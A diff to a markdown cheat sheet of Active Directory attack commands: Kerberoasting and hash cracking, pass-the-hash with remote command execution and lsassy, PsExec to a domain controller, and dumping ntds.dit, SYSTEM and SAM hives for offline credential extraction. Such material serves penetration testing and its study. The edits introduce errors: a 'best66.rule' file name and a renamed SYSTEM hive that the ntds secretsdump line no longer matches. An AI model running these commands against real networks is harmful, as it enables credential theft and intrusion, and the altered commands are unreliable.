@@ -26,7 +26,7 @@ impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}             
 impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request              # roast all
 impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
 faketime "$(ntpdate -q {{DC_IP}} | head -n 1 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
-hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
 ```
 
 Over a **pivot** (Kali reaches the DC only through a SOCKS proxy) — wrap in proxychains. If you hit
@@ -415,7 +415,6 @@ nxc smb {{DC_IP}} -u {{USERNAME}} -H {{NTLM_HASH}}                              
 nxc smb {{TARGET_IP}} -u Administrator -H {{NTLM_HASH}} -x whoami                        # -x cmd / -X ps / --sam / --lsa
 nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy
 ```
-
 > Works for **domain accounts** and the **built-in local Administrator (RID 500)** — a 2014 update
 > blocks *other* local admins from remote PtH (RID 500 stays exempt). Local-admin hash reuse across
 > hosts is the highest-yield sweep on internal nets.
@@ -478,7 +477,6 @@ misc::cmd
 PsExec.exe \\{{COMPUTER_NAME}} cmd.exe   # use the DC HOSTNAME (IP forces NTLM and is blocked)
 whoami /groups
 ```
-
 > Since July 2022 `/user:` must be an **existing** account (PAC_REQUESTOR enforcement).
 
 ---
@@ -488,10 +486,13 @@ whoami /groups
 ```cmd
 vshadow.exe -nw -p C:                  :: note the shadow device name
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
-reg.exe save hklm\system c:\system.bak
+reg.exe save hklm\system c:\users\system.save
+reg.exe save hklm\sam c:\users\sam.save
+
 ```
 ```bash
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL  # Needs the system hive to work. 
+impacket-secretsdump -sam sam.save -system system.save LOCAL 
 ```
 
 ---
